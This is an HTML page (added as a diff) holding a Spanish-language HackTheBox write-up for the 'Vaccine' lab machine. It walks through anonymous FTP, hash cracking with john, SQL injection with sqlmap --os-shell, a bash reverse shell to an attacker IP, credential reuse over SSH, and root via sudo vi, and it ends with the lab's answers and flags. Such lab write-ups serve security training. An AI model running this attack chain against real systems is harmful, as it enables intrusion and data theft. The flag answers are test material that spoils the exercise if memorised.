@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Vaccine HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/vaccine.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Vaccine HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Vaccine de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Vaccine de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Vaccine HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Vaccine HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Vaccine de la plataforma de HackTheBox","headline":"Writeup Vaccine HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Vaccine HackTheBox</h1>
+          <p>Resolución de la máquina Vaccine de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.95.174
+Nmap scan report for 10.129.95.174
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Podemos conectarnos como anonymous a ftp y vemos un archivo backup.zip</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp</span><span class="p"> 10.129.95.174 
+Connected to 10.129.95.174.
+220 (vsFTPd 3.0.3)
+Name (10.129.95.174:gato): </span><span class="kd">anonymous</span><span class="p">
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="kd">ftp></span><span class="p"> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+</span><span class="kd">ftp></span>
+</code></pre></div></div>
+
+<div><p>Asi que lo descargamos y salimos de ftp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">ftp></span><span class="p"> get backup.zip
+local: backup.zip remote: backup.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+226 Transfer complete.
+2533 bytes received in 0.00 secs (4.7366 MB/s)
+</span><span class="kd">ftp> </span><span class="p">exit
+221 Goodbye.</span>
+</code></pre></div></div>
+
+<div><p>Si intentamos descomprimirlo podemos ver que esta cifrado y necesitamos una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ unzip </span><span class="p">backup.zip
+Archive:  backup.zip
+[backup.zip] index.php password:</span>
+</code></pre></div></div>
+
+<div><p>Usando john podemos crear un hash del zip y romperlo por fuerza bruta con el rockyou</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ zip2john </span><span class="p">backup.zip > hash 
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+</span><span class="kd">741852963</span><span class="p">        (</span><span class="na">backup.zip</span><span class="p">)
+Session completed:</span>
+</code></pre></div></div>
+
+<div><p>Ahora al descomprimirlo con la contraseña podemos ver un archivo .php y un archivo .css</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ unzip </span><span class="p">backup.zip
+Archive:  backup.zip
+[backup.zip] index.php password: </span><span class="kd">741852963</span><span class="p">
+  inflating: index.php
+  inflating: style.css</span>
+</code></pre></div></div>
+
+<div><p>En el archivo php podemos ver que compara el md5 de la contraseña de admin con un hash md5</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sed </span><span class="p">-n 2,10p index.php
+&lt?php
+</span><span class="k">session_start</span><span class="p">();
+  </span><span class="kd">if</span><span class="p">(</span><span class="kd">isset</span><span class="p">($_POST[</span><span class="s2">'username'</span><span class="p">]) </span><span class="kd">&& isset</span><span class="p">($_POST[</span><span class="s2">'password'</span><span class="p">])) {
+    </span><span class="kd">if</span><span class="p">($_POST[</span><span class="s2">'username'</span><span class="p">] </span><span class="kd">===</span><span class="s2"> 'admin' </span><span class="kd">&&</span><span class="k"> md5</span><span class="p">($_POST[</span><span class="s2">'password'</span><span class="p">]) </span><span class="kd">===</span><span class="s2"> "2cb42f8734ea607eefed3b70af13bbd3"</span><span class="p">) {
+      $_SESSION[</span><span class="s2">'login'</span><span class="p">] </span><span class="kd">=</span><span class="s2"> "true"</span><span class="p">;
+      </span><span class="k">header</span><span class="p">(</span><span class="s2">"Location: dashboard.php"</span><span class="p">);
+    }
+  }
+?></span>
+</code></pre></div></div>
+
+<div><p>Con john podemos romper el hash que es una contraseña bastante débil</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+admin:2cb42f8734ea607eefed3b70af13bbd3
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">qwerty789</span><span class="p">        (</span><span class="na">admin</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>En la web podemos ver el login que puede ser el mismo php que encontramos</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Sabiendo esto podemos acceder como admin y la contraseña qwerty789</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al acceder podemos ver un catalogo de autos y en la parte superior derecha un buscador</p></div>
+<a href="./3.png" target="_blank"><div><p><img src="./3.png"><p></div></a>
+
+<div><p>Si enviamos una ' en el buscador podemos ver que nos lanza un error de sintaxis de sql</p></div>
+<a href="./4.png" target="_blank"><div><p><img src="./4.png"><p></div></a>
+
+<div><p>Podemos capturar la peticion y pasarsela a sqlmap, con esto podemos listar las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> request
+GET /dashboard.php?search=test HTTP/1.1
+Host: 10.129.95.174
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9,en;q=0.8
+Cookie: PHPSESSID=ip26dkrupcj7507kkgsnv23ha7
+Connection: close
+
+</span><span class="s2">❯ sqlmap</span><span class="p"> -r request --batch -dbs
+</span><span class="no">        ___
+       __H__
+ ___ ___[</span><span class="kd">,</span><span class="no">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.6.12#stable</span><span class="p">}
+</span><span class="no">|_ -| . [</span><span class="kd">.</span><span class="no">]     | .'| . |
+|___|_  [</span><span class="kd">,</span><span class="no">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+............................................
+
+[</span><span class="s2">INFO</span><span class="p">] fetching current database
+
+available databases [1]:
+[*] public</span>
+</code></pre></div></div>
+
+<div><p>Solo existe public, podemos listar las tablas usando la base de datos public</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -r request --batch -D public -tables
+</span><span class="no">        ___
+       __H__
+ ___ ___[</span><span class="kd">,</span><span class="no">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.6.12#stable</span><span class="p">}
+</span><span class="no">|_ -| . [</span><span class="kd">.</span><span class="no">]     | .'| . |
+|___|_  [</span><span class="kd">,</span><span class="no">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+............................................  
+
+[</span><span class="s2">INFO</span><span class="p">] fetching tables for database: 'public'
+Database: public
+[1 table]
++------+
+| cars |
++------+</span>
+</code></pre></div></div>
+
+<div><p>Podemos dumpear todas las columnas de la tabla cars pero no encontramos nada interesante</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -r request --batch -D public -T cars -dump
+</span><span class="no">        ___
+       __H__
+ ___ ___[</span><span class="kd">,</span><span class="no">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.6.12#stable</span><span class="p">}
+</span><span class="no">|_ -| . [</span><span class="kd">.</span><span class="no">]     | .'| . |
+|___|_  [</span><span class="kd">,</span><span class="no">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+............................................
+
+[</span><span class="s2">INFO</span><span class="p">] fetching entries for table 'cars' in database 'public'
+Database: public
+Table: cars
+[10 entries]
++----+--------+---------+--------+----------+
+| id | name   | type    | engine | fueltype |
++----+--------+---------+--------+----------+
+| 1  | Elixir | Sports  | 2000cc | Petrol   |
+| 2  | Sandy  | Sedan   | 1000cc | Petrol   |
+| 3  | Meta   | SUV     | 800cc  | Petrol   |
+| 4  | Zeus   | Sedan   | 1000cc | Diesel   |
+| 5  | Alpha  | SUV     | 1200cc | Petrol   |
+| 6  | Canon  | Minivan | 600cc  | Diesel   |
+| 7  | Pico   | Sed     | 750cc  | Petrol   |
+| 8  | Vroom  | Minivan | 800cc  | Petrol   |
+| 9  | Lazer  | Sports  | 1400cc | Diesel   |
+| 10 | Force  | Sedan   | 600cc  | Petrol   |
++----+--------+---------+--------+----------+</span>
+</code></pre></div></div>
+
+<div><p>No hay nada, pero hay una opcion en sqlmap que es --os-shell que nos permite ejecutar comandos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -r request --batch --os-shell
+</span><span class="no">        ___
+       __H__
+ ___ ___[</span><span class="kd">,</span><span class="no">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.6.12#stable</span><span class="p">}
+</span><span class="no">|_ -| . [</span><span class="kd">.</span><span class="no">]     | .'| . |
+|___|_  [</span><span class="kd">,</span><span class="no">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+............................................
+
+[</span><span class="s2">INFO</span><span class="p">] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+</span><span class="kd">os-shell></span><span class="p"> whoami
+command standard output: 'postgres'
+</span><span class="kd">os-shell></span>
+</code></pre></div></div>
+
+<div><p>Ejecutamos comandos como postgres, para mas comodidad nos podemos hacer una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">os-shell> </span><span class="p">bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'
+</span>
+</code></pre></div></div>
+
+<div><p>Recibimos una bash como postgres en la máquina victima, en el home de postgres está la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.95.174
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~/11/main</span><span class="p">$ id
+uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~/11/main</span><span class="p">$ hostname -I
+10.129.95.174 dead:beef::250:56ff:feb9:8422 
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~/11/main</span><span class="p">$ cat /var/lib/postgresql/user.txt 
+ec9b13ca4d6229cd5cc1e09980965bf7
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~/11/main</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En /var/www/html podemos ver un dashboard.php con credenciales para la base de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$ sed -n 40,42p dashboard.php
+</span><span class="kd">try</span><span class="p"> {
+  $conn </span><span class="kd">=</span><span class="k"> pg_connect</span><span class="p">(</span><span class="s2">"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!"</span><span class="p">);
+}
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">/var/www/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Como ssh está abierto podemos reutilizar las credenciales para conectarnos como postgres</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">postgres@10.129.95.174
+postgres@10.129.95.174's password: </span><span class="kd">P@s5w0rd!
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>A nivel de sudoers tenemos permitido ejecutar vi como root para editar un archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for postgres: </span><span class="kd">P@s5w0rd!
+</span><span class="p">Matching Defaults entries for postgres on vaccine:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User postgres may run the following commands on vaccine:
+    (</span><span class="na">ALL</span><span class="p">)</span><span class="kd"> /bin/vi /etc/postgresql/11/main/pg_hba.conf
+</span><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos abrir el archivo como root y dentro de vi spawnearnos una bash con !bash, somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">postgres@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo vi /etc/postgresql/11/main/pg_hba.conf</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">:!/bin/bash
+</span><span class="s2">root@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+dd6e058e814260bc70e9bbdef2715849
+</span><span class="s2">root@vaccine</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>Besides SSH and HTTP, what other service is hosted on this box?</strong></li>
+<ul><p></p><li>ftp</li></ul></blockquote><br>
+
+<blockquote><li><strong>This service can be configured to allow login with any password for specific username. What is that username?</strong></li>
+<ul><p></p><li>anonymous</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the file downloaded over this service?</strong></li>
+<ul><p></p><li>backup.zip</li></ul></blockquote><br>
+
+<blockquote><li><strong>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</strong></li>
+<ul><p></p><li>zip2john</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the password for the admin user on the website?</strong></li>
+<ul><p></p><li>qwerty789</li></ul></blockquote><br>
+
+<blockquote><li><strong>What option can be passed to sqlmap to try to get command execution via the sql injection?</strong></li>
+<ul><p></p><li>--os-shell</li></ul></blockquote><br>
+
+<blockquote><li><strong>What program can the postgres user run as root using sudo?</strong></li>
+<ul><p></p><li>vi</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>ec9b13ca4d6229cd5cc1e09980965bf7</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>dd6e058e814260bc70e9bbdef2715849</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
